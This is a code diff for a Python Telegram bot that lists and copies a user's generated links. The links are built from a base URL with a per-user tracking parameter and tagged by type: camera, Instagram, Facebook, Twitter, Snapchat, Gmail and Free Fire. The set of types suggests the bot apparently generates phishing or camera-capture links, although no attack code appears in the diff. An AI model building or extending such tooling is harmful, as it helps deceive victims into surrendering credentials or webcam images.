@@ -1,4 +1,5 @@
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from bot.config import BASE_URL
 from bot.utils.storage import link_cache
 
 def handle_all_links(bot, message, get_bottom_buttons):
@@ -9,11 +10,15 @@ def handle_all_links(bot, message, get_bottom_buttons):
     for key, val in link_cache.items():
         if str(val.get("user_id")) == str(user_id):
             link_type = val.get("type", "unknown")
-            link_url = f"{val.get('base_url', '')}/p/{key}?v={user_id}"  # Construct full URL
-            # Try to get full link from cache or construct
-            if 'link' in val:
-                link_url = val['link']
-            user_links.append((link_type, link_url))
+            
+            # Construct full link from stored data
+            if 'link' in val and val['link'].startswith('http'):
+                full_link = val['link']
+            else:
+                # Fallback: construct from BASE_URL
+                full_link = f"{BASE_URL}/p/{key}?v={user_id}"
+            
+            user_links.append((link_type, full_link))
     
     if not user_links:
         bot.send_message(
@@ -24,13 +29,16 @@ def handle_all_links(bot, message, get_bottom_buttons):
         )
         return
     
-    # Prepare message
+    # Prepare message with full links
     message_text = "🔗 *Your Generated Links:*\n\n"
     for link_type, link_url in user_links:
         emoji = {
-            'cam': '📸', 'ig': '📸', 'face': '📘', 
-            'twit': '🐦', 'snap': '👻', 'gmail': '📧', 
-            'free': '🎮'
+            'cam': '📸', 'instagram': '📸', 'ig': '📸',
+            'facebook': '📘', 'face': '📘',
+            'twitter': '🐦', 'twit': '🐦',
+            'snapchat': '👻', 'snap': '👻',
+            'gmail': '📧',
+            'freefire': '🎮', 'free': '🎮'
         }.get(link_type, '🔗')
         message_text += f"{emoji} *{link_type.upper()}*: `{link_url}`\n\n"
     
@@ -50,13 +58,16 @@ def handle_all_links(bot, message, get_bottom_buttons):
 def handle_copy_all(bot, call):
     user_id = call.from_user.id
     
-    # Get all links again
+    # Get all full links again
     user_links = []
     for key, val in link_cache.items():
         if str(val.get("user_id")) == str(user_id):
-            link_url = val.get('link', '')
-            if link_url:
-                user_links.append(link_url)
+            if 'link' in val and val['link'].startswith('http'):
+                user_links.append(val['link'])
+            else:
+                # Construct full link
+                full_link = f"{BASE_URL}/p/{key}?v={user_id}"
+                user_links.append(full_link)
     
     if not user_links:
         bot.answer_callback_query(call.id, "❌ No links to copy!")
@@ -65,7 +76,6 @@ def handle_copy_all(bot, call):
     # Combine all links into one text
     all_links_text = "\n".join(user_links)
     
-    # Send as code block for easy copy
     bot.send_message(
         user_id,
         f"📋 *All your links (copy them below):*\n\n```\n{all_links_text}\n```",
